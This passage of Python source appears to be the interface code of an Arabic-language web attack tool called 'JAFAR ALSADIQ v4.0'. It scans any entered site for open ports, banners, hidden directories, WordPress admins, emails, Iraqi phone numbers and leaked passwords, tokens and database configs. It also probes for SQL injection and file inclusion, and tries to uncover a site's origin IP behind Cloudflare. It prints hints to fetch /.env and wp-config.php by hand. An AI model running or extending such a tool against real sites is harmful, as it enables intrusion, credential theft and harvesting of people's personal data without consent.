                     if "اختياري" in self.wl.get() else None)
        tk.Button(r2, text="📂", font=("Arial", 12), bg="#004400",
                  fg="white", relief="flat", padx=8, pady=4,
                  cursor="hand2", command=self._browse
                  ).pack(side="left", padx=4)
        tk.Label(r2, text=" Threads:", font=("Arial", 11),
                 fg="#00aa30", bg="#001500").pack(side="left", padx=(14, 3))
        self.thv = tk.StringVar(value="50")
        om = tk.OptionMenu(r2, self.thv, "10", "20", "30", "50", "80")
        om.config(bg="#004400", fg="white", relief="flat")
        om.pack(side="left")

        pf = tk.Frame(self.root, bg="#000a00")
        pf.pack(fill="x", padx=8, pady=(2, 3))
        self.pl = tk.Label(pf, text="", font=("Consolas", 11),
                           fg="#00cc33", bg="#000a00")
        self.pl.pack(side="left", padx=8)
        self.pv = tk.DoubleVar()
        sty = ttk.Style(); sty.theme_use('clam')
        sty.configure("G.Horizontal.TProgressbar",
                      background="#00ff41", troughcolor="#002200",
                      bordercolor="#000a00")
        self.pbar = ttk.Progressbar(pf, variable=self.pv, maximum=1.0,
                                     length=350, style="G.Horizontal.TProgressbar")
        self.pbar.pack(side="left", padx=5)
        self.pct = tk.Label(pf, text="", font=("Consolas", 11, "bold"),
                            fg="#00ff41", bg="#000a00")
        self.pct.pack(side="left", padx=5)
        for t, c in [("📋", self._cp), ("📄", self._sv),
                     ("🌐", self._html), ("🗑️", self._cl)]:
            tk.Button(pf, text=t, font=("Arial", 11), bg="#003300",
                      fg="white", relief="flat", padx=8, cursor="hand2",
                      command=c).pack(side="right", padx=3)

        of = tk.Frame(self.root, bg="#000a00",
                       highlightbackground="#004400", highlightthickness=2)
        of.pack(fill="both", expand=True, padx=8, pady=(0, 8))
        sb = tk.Scrollbar(of, bg="#004400", troughcolor="#001100")
        sb.pack(side="right", fill="y")
        self.out = tk.Text(of, font=("Consolas", 13), bg="#000800",
                           fg="#00ff41", insertbackground="#00ff41",
                           relief="flat", wrap="word", spacing1=2, spacing3=1,
                           selectbackground="#003300", yscrollcommand=sb.set,
                           state="disabled")
        self.out.pack(fill="both", expand=True)
        sb.config(command=self.out.yview)
        for tag, clr in [("hdr","#00ff41"),("ok","#00ff41"),("warn","#ffaa00"),
                         ("danger","#ff4444"),("info","#44ccff"),("dim","#006622"),
                         ("cyan","#00ffff"),("gold","#ffd700"),("red2","#ff6666")]:
            kw = {"foreground": clr}
            if tag == "hdr": kw["font"] = ("Consolas", 13, "bold")
            self.out.tag_configure(tag, **kw)
        self._wr("🔍  JAFAR ALSADIQ v4.0\n\n"
                 "    أدخل الرابط واضغط فحص\n"
                 "    F11 = شاشة كاملة | ESC = خروج\n")

    def _wr(self, t, c=True):
        self.out.config(state="normal")
        if c: self.out.delete("1.0", "end")
        self.out.insert("end", t)
        self.out.config(state="disabled"); self.out.see("end")

    def _ap(self, t, tag=None):
        self.out.config(state="normal")
        self.out.insert("end", t, tag) if tag else self.out.insert("end", t)
        self.out.config(state="disabled"); self.out.see("end")

    def _pr(self, t, v=None, pct_text=""):
        self.pl.config(text=t)
        if v is not None: self.pv.set(min(v, 1.0))
        self.pct.config(text=pct_text)

    def _browse(self):
        fn = filedialog.askopenfilename(filetypes=[("Text", "*.txt")])
        if fn: self.wl.delete(0, "end"); self.wl.insert(0, fn)

    def _tick(self):
        if not self.scanning: return
        el = int(time.time() - self.start_time)
        self.timer.config(text=f"⏱ {el//60:02d}:{el%60:02d}")
        self.root.after(1000, self._tick)

    def _run(self):
        target = self.url.get().strip()
        if not target or "اختياري" in target:
            messagebox.showwarning("!", "أدخل الرابط!"); return
        if self.scanning: return
        self.scanning = True; self.start_time = time.time(); self._tick()

        def work():
            e = self.eng; url = e.norm(target); d = e.dom(url)

            # تحويل www لـ apex domain للبحث
            apex = d
            if apex.startswith('www.'):
                apex = apex[4:]
            N = 19; n = [0]; all_emails = set()

            def pr(m):
                n[0] += 1
                self.root.after(0, lambda: self._pr(m, n[0]/N, f"{int(n[0]/N*100)}%"))
            def ad(t, tg=None):
                self.root.after(0, lambda: self._ap(t, tg))
            def sec(t):
                ad(f"\n┌{'─'*48}┐\n", "dim")
                ad(f"│ {t}\n", "hdr")
                ad(f"└{'─'*48}┘\n", "dim")

            self.root.after(0, lambda: self._wr(
                f"\n╔{'═'*50}╗\n"
                f"║  🔍 JAFAR ALSADIQ v4.0{' '*30}║\n"
                f"║  🎯 {d}"
                f"{' (apex: ' + apex + ')' if apex != d else ''}"
                f"{' '*(45-len(d)-( len(apex)+9 if apex != d else 0))}║\n"
                f"║  🕐 {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}{' '*26}║\n"
                f"╚{'═'*50}╝\n\n"))

            # 1. IP
            pr("🌐 IP..."); ip_data = e.get_ip(d)
            sec("🌐 IP")
            ad(f" {ip_data.get('ip','?')}\n", "cyan")
            ad(f" {ip_data.get('city','?')}, {ip_data.get('country','?')}\n")
            ad(f" {ip_data.get('isp','?')} ({ip_data.get('as','?')})\n", "dim")

            # 2. Ports
            pr("📡 Ports..."); sip = ip_data.get('ip','')
            pts = e.get_ports(sip) if sip else []
            sec(f"📡 البورتات ({len(pts)})")
            if pts:
                # تصنيف البورتات
                dangerous = [p for p in pts if p['d']]
                normal = [p for p in pts if not p['d']]

                # البورتات الخطيرة أولاً
                if dangerous:
                    ad(f" ── 🔴 خطيرة ({len(dangerous)}) ──\n","danger")
                    for p in dangerous:
                        ad(f" 🔴 {p['p']:5d}  {p['sv']:15s} ⚠️ مكشوف للإنترنت!\n","danger")

                # البورتات العادية
                if normal:
                    ad(f"\n ── 🟢 عادية ({len(normal)}) ──\n","dim")
                    for p in normal:
                        notes = {
                            22:  "إدارة السيرفر",
                            80:  "HTTP",
                            443: "HTTPS",
                            110: "بريد POP3",
                            143: "بريد IMAP",
                            993: "بريد IMAPS",
                            995: "بريد POP3S",
                            25:  "SMTP",
                            53:  "DNS",
                        }
                        note = notes.get(p['p'], "")
                        ad(f" 🟢 {p['p']:5d}  {p['sv']:15s} {note}\n","dim")

                # تحذير مهم
                if dangerous:
                    ad(f"\n ⚠️ ملاحظة: البورتات الخطيرة مفتوحة على\n","warn")
                    ad(f"    IP السيرفر — ممكن مشترك مع مواقع أخرى\n","dim")
                    ad(f"    لكن {', '.join([str(p['p']) for p in dangerous])}"
                       f" مكشوف = خطر حقيقي\n","danger")
            else:
                ad(" ✅ لم يتم اكتشاف بورتات مفتوحة\n","ok")

            # 3. Banners
            pr("🏷️ Banners..."); bns = []
            if sip and pts:
                bns = e.get_banners(sip, pts)
                if bns:
                    sec(f"🏷️ BANNERS ({len(bns)})")
                    for b in bns:
                        ad(f" Port {b['p']}:\n", "info")
                        for ln in b['b'].split('\n')[:2]:
                            if ln.strip(): ad(f"   {ln.strip()}\n", "dim")

            # 4. SSL
            pr("🔒 SSL..."); ssl_d = e.get_ssl(d)
            sec("🔒 SSL")
            if ssl_d.get('valid'):
                iss = ssl_d.get('issuer', {})
                ad(f" ✅ صالح | {iss.get('organizationName', iss.get('commonName','?'))}\n", "ok")
                ad(f" ينتهي: {ssl_d.get('expires','?')}\n", "dim")
            else: ad(f" ❌ {ssl_d.get('error','غير صالح')}\n", "danger")

            # 5. HTTP
            pr("🖥️ HTTP..."); http = e.get_http(url); wu = http.get('url', url)
            if http.get('status', 0) == 0:
                alt = url.replace('https://', 'http://') if 'https://' in url else url.replace('http://', 'https://')
                http = e.get_http(alt); wu = http.get('url', alt)
            site_alive = http.get('status', 0) in [200, 301, 302, 403, 404, 500]
            is_cf = http.get('waf') == 'Cloudflare'
            sec("🖥️ HTTP")
            if http.get('error') and http.get('status', 0) == 0:
                # فشل حقيقي — ما صار اتصال
                ad(f" ❌ {http['error']}\n", "danger")
            elif http.get('status', 0) > 0:
                # نجح الاتصال — حتى لو 403
                st = http['status']
                if st == 200:
                    ad(f" Status: {st} ✅\n", "ok")
                elif st == 403:
                    ad(f" Status: {st} 🔒 محظور (Cloudflare/WAF)\n", "warn")
                elif st == 301 or st == 302:
                    ad(f" Status: {st} 🔀 Redirect\n", "info")
                else:
                    ad(f" Status: {st}\n", "warn")

                if http.get('title'):
                    ad(f" Title:  {http['title']}\n")
                ad(f" Server: {http.get('server','?')}\n",
                   "warn" if '/' in http.get('server', '') else None)
                if http.get('xpb'):
                    ad(f" PHP:    {http['xpb']}\n", "warn")
                waf = http.get('waf', 'لا يوجد')
                if waf != 'لا يوجد':
                    ad(f" WAF:    {waf} ✅\n", "ok")
                else:
                    ad(f" WAF:    لا يوجد ❌\n", "danger")
                ad(f" Time:   {http.get('time','?')}s"
                   f" | Size: {http.get('size',0):,}B\n", "dim")
                if http.get('tech'):
                    ad(f" Tech:   {', '.join(http['tech'])}\n", "info")
                if http.get('gen'):
                    ad(f" CMS:    {http['gen']}\n", "gold")
                if http.get('cms_ver'):
                    ad(f" Ver:    {http.get('cms_ver','')}\n", "gold")
            else:
                ad(f" ⚠️ {http.get('error','تعذر الاتصال')}\n", "warn")

            site_alive = http.get('status', 0) in [200, 301, 302, 403, 404, 500]
            is_cf = (http.get('waf') == 'Cloudflare' or
                     'cloudflare' in http.get('server', '').lower())

            # 6. Mail
            pr("📬 Mail..."); dns, soa_em, has_dmarc, has_spf = e.get_dns(apex)
            if soa_em and e.ok_email(soa_em): all_emails.add(soa_em)
            sec("📬 MAIL")
            is_google = any('google' in str(r).lower() for r in dns.get('MX', []))
            if is_google: ad(f" Provider: Google Workspace\n", "info")
            ad(f" {'✅' if has_spf else '❌'} SPF   {'✅' if has_dmarc else '❌'} DMARC\n",
               "ok" if has_spf and has_dmarc else "warn")

            # 7. WHOIS
            pr("🔗 WHOIS..."); wh = e.get_whois(d)
            for k in ['reg_email','admin_email']:
                v = wh.get(k)
                if v and e.ok_email(v): all_emails.add(v.lower())
            sec("🔗 WHOIS")
            found_wh = False
            for k, lb in [('registrar','Registrar'),('created','Created'),('expires','Expires'),
                          ('reg_name','Name'),('reg_org','Org'),('admin_name','Admin')]:
                v = wh.get(k)
                if v and v != '?': ad(f" {lb:12s} {v}\n"); found_wh = True
            if not found_wh:
                tld = d.split('.')[-1] if '.' in d else ''
                ad(f" ⚠️ WHOIS غير متاح\n", "dim")
                ad(f" 💡 https://www.whois.com/whois/{d}\n", "info")
                if tld == 'iq': ad(f" 💡 https://cmc.iq\n", "info")

            # 8. Headers
            pr("🛡️ الرؤوس...")
            sh = e.get_headers(http.get('headers', {}))

            # إذا الرد 403 من Cloudflare → لا نحكم على headers
            blocked_by_waf = (
                http.get('status') == 403 and
                http.get('waf') == 'Cloudflare'
            )

            if site_alive and not blocked_by_waf:
                sec("🛡️ HEADERS")
                for h, dd in sh.items():
                    ad(f" {'✅' if dd['p'] else '❌'} {h:35s} [{dd['s']}]\n",
                       "ok" if dd['p'] else ("danger" if dd['s'] == 'عالي' else "warn"))

            elif blocked_by_waf:
                sec("🛡️ HEADERS")
                ad(" ⚠️ تعذر تقييم Security Headers الأصلية\n", "warn")
                ad(" السبب: الرد الحالي 403 صادر من Cloudflare/WAF\n", "dim")
                ad(" قد تكون الصفحة الأصلية تملك Headers مختلفة\n", "dim")
                ad(" لذا لن نحسب هذا القسم ضد الموقع\n", "dim")

            else:
                sec("🛡️ HEADERS")
                ad(" ⚠️ تعذر تقييم Security Headers\n", "warn")
                ad(" السبب: الموقع لم يرد بشكل كامل\n", "dim")

            
            
            # 9. Subdomains — فقط 200
            pr("📂 Subs...")
            subs = []
            try:
                result = e.get_subs(
                    apex,
                    lambda m: self.root.after(
                        0, lambda: self._pr(f"📂 {m}")))
                
                if result is None:
                    subs = []
                elif isinstance(result, (list, tuple, set)):
                    subs = list(result)
                else:
                    subs = []
            except Exception:
                subs = []

            sec(f"📂 السابدومينز ({len(subs)} مكتشف)")

            if not subs:
                ad(" ⚠️ لم يتم اكتشاف subdomains\n", "warn")
                ad(" السبب المحتمل:\n", "dim")
                ad("  • rate limit من crt.sh أو HackerTarget\n", "dim")
                ad("  • الدومين جديد أو ما عنده سجلات عامة\n", "dim")
                ad(f"  • جرب يدوياً: crt.sh/?q=%.{apex}\n", "info")
            elif site_alive:
                # فحص الـ subdomains بشكل متوازٍ
                sub_res = {}

                def safe_chk_sub(sub):
                    try:
                        if hasattr(e, "chk_sub"):
                            return e.chk_sub(sub)
                        r = {'st': 0, 'ip': '', 'title': ''}
                        try:
                            r['ip'] = socket.gethostbyname(sub)
                        except:
                            r['st'] = 'NX'
                            return r
                        for sc in ['http', 'https']:
                            try:
                                resp = e.s.get(
                                    f"{sc}://{sub}",
                                    timeout=1.5,
                                    allow_redirects=True)
                                resp.encoding = (resp.apparent_encoding
                                                 or 'utf-8')
                                r['st'] = resp.status_code
                                t = re.search(
                                    r'<title[^>]*>(.*?)</title>',
                                    resp.text, re.I | re.DOTALL)
                                if t:
                                    try:
                                        r['title'] = e.fix_encoding(
                                            t.group(1).strip()[:40])
                                    except:
                                        r['title'] = t.group(1).strip()[:40]
                                break
                            except:
                                continue
                        if r['st'] == 0:
                            r['st'] = 'TO'
                        return r
                    except Exception:
                        return {'st': 'ERR', 'ip': '', 'title': ''}

                with concurrent.futures.ThreadPoolExecutor(
                        max_workers=20) as ex:
                    futs = {
                        ex.submit(safe_chk_sub, s): s
                        for s in subs[:60]}
                    for fut in concurrent.futures.as_completed(futs):
                        sub = futs[fut]
                        try:
                            sub_res[sub] = fut.result()
                        except:
                            sub_res[sub] = {
                                'st': 'ERR', 'ip': '', 'title': ''}

                # فقط الشغالة 200
                alive_subs = [
                    (s, sub_res[s])
                    for s in subs[:60]
                    if sub_res.get(s, {}).get('st') == 200
                ]

                # الممنوعة 403
                forbidden_subs = [
                    (s, sub_res[s])
                    for s in subs[:60]
                    if sub_res.get(s, {}).get('st') == 403
                ]

                # الـ Timeout والـ NX
                dead_subs = [
                    s for s in subs[:60]
                    if sub_res.get(s, {}).get('st')
                    in ['TO', 'NX', 'ERR', 0]
                ]

                if alive_subs:
                    ad(f" ── 🟢 شغالة ({len(alive_subs)}) ──\n", "hdr")
                    for s, st in alive_subs:
                        ad(f" 🟢 {s}\n", "ok")
                        if st.get('title'):
                            ad(f"    📄 {st['title']}\n", "dim")

                if forbidden_subs:
                    ad(f"\n ── 🟡 ممنوعة/403 ({len(forbidden_subs)}) ──\n",
                       "hdr")
                    for s, st in forbidden_subs:
                        ad(f" 🟡 {s}\n", "warn")

                if not alive_subs and not forbidden_subs:
                    ad(" ⚠️ كل الـ subdomains لم تستجب\n", "warn")
                    ad(f" إجمالي مكتشف: {len(subs)}"
                       f" | Timeout: {len(dead_subs)}\n", "dim")

                # ملخص
                ad(f"\n 📊 {len(subs)} مكتشف"
                   f" | {len(alive_subs)} شغال"
                   f" | {len(forbidden_subs)} ممنوع"
                   f" | {len(dead_subs)} لم يستجب\n", "dim")

            else:
                # الموقع ما يرد — نعرض القائمة بدون فحص
                ad(" ⚠️ الموقع لم يرد — عرض بدون تحقق\n", "warn")
                for s in subs[:20]:
                    ad(f"  📌 {s}\n", "dim")
                if len(subs) > 20:
                    ad(f"  ... و{len(subs) - 20} آخرين\n", "dim")

            # 10. Robots
            pr("📋 robots...")
            if site_alive:
                rob = e.get_robots(wu)
                sec("📋 ROBOTS")

                if rob['cms_hints']:
                    ad(f" 🔍 CMS: {', '.join(sorted(set(rob['cms_hints'])))}\n", "gold")

                if rob.get('managed') == 'Cloudflare':
                    ad(" ⚠️ هذا robots.txt مُدار من Cloudflare\n", "warn")

                if rob['sm']:
                    for sm in rob['sm'][:5]:
                        ad(f" 🗺️ Sitemap: {sm}\n", "info")

                if rob['checked']:
                    sens_words = ['changelog','config','cron','update',
                                  'install','settings','setup','admin',
                                  'backup','.env','license','maintainers']

                    for item in rob['checked']:
                        st = item['st']
                        path = item['path']
                        is_sensitive = any(w in path.lower() for w in sens_words)

                        if st == 200:
                            ad(f" {'🔴' if is_sensitive else '🟢'} {path:25s} {st}"
                               f"{'  ⚠️ حساس!' if is_sensitive else ''}\n",
                               "danger" if is_sensitive else "ok")
                        elif st in [301, 302]:
                            ad(f" 🔀 {path:25s} {st}\n", "info")
                        elif st in [401, 403]:
                            ad(f" 🟡 {path:25s} {st}\n", "warn")
                        elif st == 500:
                            ad(f" 💥 {path:25s} {st}\n", "danger")
                        else:
                            ad(f" ❌ {path:25s} {st}\n", "dim")

                elif rob['managed'] == 'Cloudflare':
                    ad(" ℹ️ لا توجد مسارات حساسة مفيدة — الملف خاص بسياسات Cloudflare\n", "dim")

                elif not rob['dis']:
                    ad(" ℹ️ لا توجد Disallow paths مفيدة\n", "dim")

            # 11. Fuzzing
            pr("💥 Fuzzing...")
            fz = []
            if site_alive:
                wlp = self.wl.get().strip()
                if "اختياري" in wlp:
                    wlp = None
                th = int(self.thv.get())

                def fuzz_cb(done, total, found, remain):
                    pct = int(done / total * 100) if total else 0
                    self.root.after(0, lambda: self._pr(
                        f"💥 {done:,}/{total:,} | {found} found | ~{remain}s",
                        done / total if total else 0, f"{pct}%"))

                fz = e.fuzz(wu, wlp, th, fuzz_cb)

                if fz:
                    sens = ['.env', '.git', 'backup', 'phpmyadmin', 'phpinfo',
                            'wp-config', 'credentials', 'id_rsa',
                            'settings.php', 'CHANGELOG']

                    # تقسيم حسب النوع
                    fz_200 = [f for f in fz if f['st'] == 200]
                    fz_301 = [f for f in fz if f['st'] in [301, 302]]
                    fz_500 = [f for f in fz if f['st'] == 500]

                    sec(f"💥 المسارات ({len(fz)})")

                    # 200 — مفتوح
                    if fz_200:
                        ad(f" ── ✅ مفتوح ({len(fz_200)}) ──\n", "hdr")
                        for f in fz_200:
                            is_s = any(s in f['p'].lower() for s in sens)
                            ic = "🔴" if is_s else "🟢"
                            tg = "danger" if is_s else "ok"
                            sz = (f"{f['sz']:,}B" if f['sz'] < 10000
                                  else f"{f['sz'] // 1024}KB")
                            ad(f" {ic} {f['p']:28s} 200  {sz:>7s}\n", tg)
                            if is_s:
                                ad(f"    ⚠️ حساس!\n", "danger")

                    # 301/302 — محوّل
                    if fz_301:
                        ad(f"\n ── 🔀 محوّل ({len(fz_301)}) ──\n", "hdr")
                        for f in fz_301:
                            ad(f" 🔀 {f['p']:28s} {f['st']}", "info")
                            if f.get('rd'):
                                ad(f"  → {f['rd'][:40]}\n", "dim")
                            else:
                                ad("\n")

                    # 500 — خطأ سيرفر
                    if fz_500:
                        ad(f"\n ── 💥 خطأ سيرفر ({len(fz_500)}) ──\n", "hdr")
                        for f in fz_500:
                            ad(f" 💥 {f['p']:28s} 500\n", "warn")

                else:
                    sec("💥 DIRECTORIES")
                    ad(" ✅ لم يتم العثور على مسارات\n", "ok")
            else:
                sec("💥 DIRECTORIES")
                ad(" ⚠️ تعذر — الموقع لم يرد\n", "warn")

            # ── People + Emails + Creds ──
            pr("👤 Gathering Intel...")
            # نشغل scan_people دائماً بغض النظر عن site_alive
            try:
                ppl = e.scan_people(wu, d, all_emails)
            except Exception:
                ppl = {'admins':[], 'phones_iq':[], 'phones_intl':[], 'names':[], 'social':[]}

            try:
                creds_data = e.get_creds(wu)
            except Exception:
                creds_data = {'usr':[], 'pwd':[], 'tok':[], 'cfg':[]}

            try:
                secrets_data = e.get_secrets(wu)
            except Exception:
                secrets_data = {'sec':[], 'ep':[]}

            # ─── أدمنية WordPress ───
            if ppl['admins']:
                sec(f"🔑 WORDPRESS ADMINS ({len(ppl['admins'])})")
                for a in ppl['admins']:
                    link_info = f"  🔗 {a.get('link','')}" if a.get('link') else ""
                    ad(f" 👤 {str(a['name']):22s}"
                       f" @{str(a['slug']):16s}"
                       f" ID:{a['id']}{link_info}\n", "gold")
            else:
                # نبيّن ليش مافي نتائج
                sec("🔑 WORDPRESS ADMINS")
                ad(" ℹ️ لم يتم اكتشاف أدمنية\n", "dim")
                ad(" السبب المحتمل: Cloudflare يبلوك /wp-json أو الموقع مو WordPress\n", "dim")
                ad(f" 💡 جرب يدوياً: {wu}/?author=1\n", "info")
                ad(f" 💡 أو: {wu}/wp-json/wp/v2/users\n", "info")

            # ─── إيميلات ───
            if all_emails:
                sec(f"📧 EMAILS ({len(all_emails)})")
                for v in e.verify_emails(all_emails):
                    pv = f" [{v['prov']}]" if v.get('prov') else ""
                    ad(f" {'✅' if v['ok'] else '❌'}"
                       f" {v['em']:35s}{pv} {v['why']}\n",
                       "ok" if v['ok'] else "warn")
            else:
                sec("📧 EMAILS")
                ad(" ℹ️ لم يتم اكتشاف إيميلات مباشرة\n", "dim")
                ad(" السبب: Cloudflare يشفر الإيميلات في الصفحة\n", "dim")
                ad(f" 💡 جرب: {wu}/contact أو {wu}/about\n", "info")

            # ─── هواتف عراقية ───
            if ppl['phones_iq']:
                sec(f"📞 هواتف عراقية ({len(ppl['phones_iq'])})")
                for p in ppl['phones_iq']:
                    try:
                        cr = e.carrier(p)
                    except:
                        cr = ''
                    ad(f" 🇮🇶 {p:22s}"
                       f"{f' [{cr}]' if cr else ''}\n", "cyan")
            else:
                sec("📞 هواتف")
                ad(" ℹ️ لا أرقام هاتف مكتشفة في الصفحات العامة\n", "dim")

            # ─── هواتف دولية ───
            if ppl['phones_intl']:
                sec(f"📞 هواتف دولية ({len(ppl['phones_intl'])})")
                for p in ppl['phones_intl']:
                    ad(f" 🌐 {p}\n", "info")

            # ─── أسماء وسوشيال ───
            if ppl['names'] or ppl['social']:
                sec(f"👤 NAMES & SOCIAL ({len(ppl['names'])+len(ppl['social'])})")
                for n in ppl['names']:
                    ad(f" 👤 {n}\n", "info")
                for s in ppl['social']:
                    ad(f" 🔗 {s}\n", "info")

            # ─── كلمات سر + توكنات + credentials ───
            has_creds = any(
                creds_data.get(k) for k in ['usr', 'pwd', 'tok', 'cfg']
                if not all(v.startswith('[مكتشف') for v in creds_data.get(k, []))
            )
            has_sec = bool(secrets_data.get('sec'))

            if has_creds or has_sec:
                sec("🔐 SECRETS & CREDENTIALS ⚠️")

                if creds_data.get('usr'):
                    ad(" ── 👤 Usernames ──\n", "hdr")
                    for v in creds_data['usr']:
                        if not v.startswith('['):
                            ad(f"  🔴 {v}\n", "danger")

                if creds_data.get('pwd'):
                    ad(" ── 🔑 Passwords / Keys ──\n", "hdr")
                    for v in creds_data['pwd']:
                        if not v.startswith('['):
                            ad(f"  🔴 {v}\n", "danger")

                if creds_data.get('tok'):
                    ad(" ── 🎟️ Tokens / API Keys ──\n", "hdr")
                    for v in creds_data['tok']:
                        if not v.startswith('['):
                            ad(f"  🔴 {v}\n", "danger")

                if creds_data.get('cfg'):
                    real_cfg = [v for v in creds_data['cfg'] if not v.startswith('[مكتشف')]
                    found_in = [v for v in creds_data['cfg'] if v.startswith('[مكتشف')]
                    if real_cfg:
                        ad(" ── ⚙️ DB Config ──\n", "hdr")
                        for v in real_cfg:
                            ad(f"  🔴 {v}\n", "danger")
                    if found_in:
                        ad(" ── 📄 صفحات مكتشفة ──\n", "hdr")
                        for v in found_in:
                            ad(f"  ⚠️ {v}\n", "warn")

                if secrets_data.get('sec'):
                    ad(" ── 💀 JS Leaks ──\n", "hdr")
                    for s in secrets_data['sec']:
                        ad(f"  🔴 {s['t']:14s}"
                           f" → {s['v']}\n", "danger")
            else:
                sec("🔐 SECRETS & CREDENTIALS")
                ad(" ✅ لا credentials مكتشفة\n", "ok")
                ad(" ℹ️ Cloudflare يحمي ملفات .env و wp-config.php\n", "dim")
                ad(f" 💡 جرب يدوياً: {wu}/.env  |  {wu}/wp-config.php\n", "info")

            # ─── Endpoints من JS ───
            if secrets_data.get('ep'):
                sec(f"🔗 API ENDPOINTS ({len(secrets_data['ep'])})")
                for ep in secrets_data['ep']:
                    ad(f" 🔗 {ep}\n", "info")

            # 15. Cookies
            try:
                ck = e.get_cookies(wu)
                if ck:
                    sec(f"🍪 COOKIES ({len(ck)})")
                    for c in ck:
                        ad(f" 🍪 {c['n']:20s}"
                           f" Sec:{'🔒' if c['sec'] else '⚠️'}"
                           f" HO:{'✅' if c['ho'] else '❌'}\n",
                           "ok" if c['sec'] and c['ho'] else "warn")
                else:
                    sec("🍪 COOKIES")
                    ad(" ℹ️ لا كوكيز مكتشفة\n", "dim")
            except:
                pass

            # 16. Forms
            if site_alive:
                try:
                    fm = e.get_forms(wu)
                    if fm:
                        sec(f"📝 FORMS ({len(fm)})")
                        for f in fm:
                            ftype_icon = {'Login':'🔑','Upload':'📁',
                                'Search':'🔍','Contact':'📧',
                                'Drupal':'🟣','Other':'📝'}.get(f['type'],'📝')
                            ad(f" {ftype_icon} [{f['m']}] → {f['a']} ({f['type']})\n", "info")
                            if f['pw']: ad(f"    🔑 Password Field\n", "warn")
                            if f['up']: ad(f"    📁 File Upload\n", "warn")
                            if f.get('drupal'): ad(f"    🟣 Drupal Form\n", "gold")
                            if f['i']: ad(f"    📥 {', '.join(f['i'][:5])}\n", "dim")
                except: pass

                # Source Maps + Encoded Strings
                try:
                    if secrets_data.get('maps'):
                        ad(f"\n ── 🗺️ Source Maps ({len(secrets_data['maps'])}) ──\n", "hdr")
                        for m in secrets_data['maps']:
                            ad(f"  📍 {m}\n", "warn")
                    if secrets_data.get('strings'):
                        ad(f"\n ── 🔐 Encoded Strings ──\n", "hdr")
                        for s in secrets_data['strings']:
                            ad(f"  🔴 {s['encoded']}\n", "danger")
                            ad(f"     → {s['decoded'][:80]}\n", "warn")
                except: pass

            # 17. Comments
            if site_alive:
                try:
                    cm = e.get_comments(wu)
                    if cm:
                        sec(f"💬 COMMENTS ({len(cm)})")
                        for c in cm:
                            ad(f" 💬 {c[:70]}\n", "dim")
                except: pass

            # 18. Same Server — تجاهل Cloudflare
            if sip and not is_cf:
                rv = e.rev_ip(sip)
                if rv:
                    sec(f"🌐 SAME SERVER ({len(rv)})")
                    for dd in rv: ad(f" 🌐 {dd}\n", "info")

            # Spider
            if site_alive:
                pr("🕷️ Spider...")
                sp = e.spider(wu, 20, lambda d2, t: self.root.after(
                    0, lambda: self._pr(f"🕷️ {d2}/{t}", d2/t, f"{int(d2/t*100)}%")))
                if sp['pg']:
                    sec(f"🕷️ SPIDER ({len(sp['pg'])})")
                    tl = e.build_tree(sp['pg'])
                    if tl:
                        for l in tl: ad(f"  {l}\n", "dim")
                    if sp['fl']:
                        ad(f"\n 📁 Files ({len(sp['fl'])}):\n", "hdr")
                        for f in sp['fl'][:15]:
                            fname = unquote(f.split('/')[-1].split('?')[0])
                            ext = fname.split('.')[-1].lower() if '.' in fname else ''
                            icon = {'pdf':'📄','xls':'📊','xlsx':'📊','csv':'📊',
                                    'sql':'🗄️','db':'🗄️','zip':'📦','js':'📜',
                                    'bak':'⚠️','env':'🔴'}.get(ext,'📄')
                            ad(f"  {icon} {fname}\n", "info")
                            ad(f"     🔗 {f}\n", "dim")

            # SQLi + LFI
            sq = []
            lf = []
            if site_alive:
                pr("💉 Vuln scan...")
                try:
                    sq = e.sqli(wu)
                    if sq:
                        sec(f"💉 SQLi ({len(sq)})")
                        for s in sq:
                            ad(f" 🔴 {s['pm']}: {s['pl']} → {s['ev']}\n", "danger")
                    else:
                        sec("💉 SQLi")
                        ad(" ✅ لا ثغرات SQL\n", "ok")
                except: pass

                try:
                    lf = e.lfi(wu)
                    if lf:
                        sec(f"📂 LFI ({len(lf)})")
                        for l in lf:
                            ad(f" 🔴 {l['pm']}: {l['pl']} → {l['ev']}\n", "danger")
                    else:
                        sec("📂 LFI")
                        ad(" ✅ لا ثغرات LFI\n", "ok")
                except: pass

            # 19. CVE — 100 ثغرة
            pr("🔓 CVE...")
            cves = e.match_cve(http, pts, bns)
            if cves:
                sec(f"🔓 CVE ({len(cves)})")
                sev_colors = {'حرج':'danger','عالي':'warn','متوسط':'warn','منخفض':'dim','معلومات':'info'}
                sev_icons = {'حرج':'🔴','عالي':'🟠','متوسط':'🟡','منخفض':'🟢','معلومات':'ℹ️'}
                for cv in cves:
                    ic = sev_icons.get(cv['s'], '⚠️')
                    tg = sev_colors.get(cv['s'], 'dim')
                    cvss = f" CVSS:{cv['cvss']}" if cv.get('cvss',0) > 0 else ""
                    ad(f" {ic} {cv['c']:22s} [{cv['s']}]{cvss}\n", tg)
                    ad(f"    {cv['d']}\n", "info")
                    if cv['c'] not in ['Multiple','INFO-001']:
                        ad(f"    🔗 nvd.nist.gov/vuln/detail/{cv['c']}\n", "dim")
                    ad("\n")
            else:
                sec("🔓 CVE")
                ad(" ✅ لا ثغرات مكتشفة\n", "ok")

            # CDN Bypass
            cd = e.cdn_bypass(apex)
            has_cdn_bypass = (cd['web_ips'] or
                              cd['mail_ips'] or
                              cd['other_ips'])
            if has_cdn_bypass:
                sec("🌐 CDN BYPASS")

                if cd['web_ips']:
                    ad(" ── 🔴 Web Server IP (مهم جداً) ──\n", "hdr")
                    for entry in cd['web_ips']:
                        ad(f" 🔴 {entry['ip']}"
                           f" ({entry['sub']})"
                           f" {entry['city']}, {entry['country']}\n",
                           "danger")
                        ad(f"    ⚠️ هذا قد يكون الـ origin الحقيقي"
                           f" للموقع!\n", "warn")

                if cd['mail_ips']:
                    ad("\n ── 📧 Mail Server IP ──\n", "hdr")
                    for entry in cd['mail_ips']:
                        ad(f" 🟡 {entry['ip']}"
                           f" ({entry['sub']})"
                           f" {entry['city']}, {entry['country']}\n",
                           "warn")
                        ad(f"    ℹ️ هذا IP خدمة البريد —"
                           f" مو بالضرورة الـ web server\n", "dim")

                if cd['other_ips']:
                    ad("\n ── 🔵 IPs أخرى ──\n", "hdr")
                    for entry in cd['other_ips']:
                        ad(f" 🔵 {entry['ip']}"
                           f" ({entry['sub']})"
                           f" {entry['city']}, {entry['country']}\n",
                           "info")
            else:
                ad(" ✅ لم يتم كشف IP حقيقي\n", "ok")

            # GitHub
            gh = e.github(apex)
            if gh:
                sec(f"🔍 GITHUB ({len(gh)})")
                for g in gh:
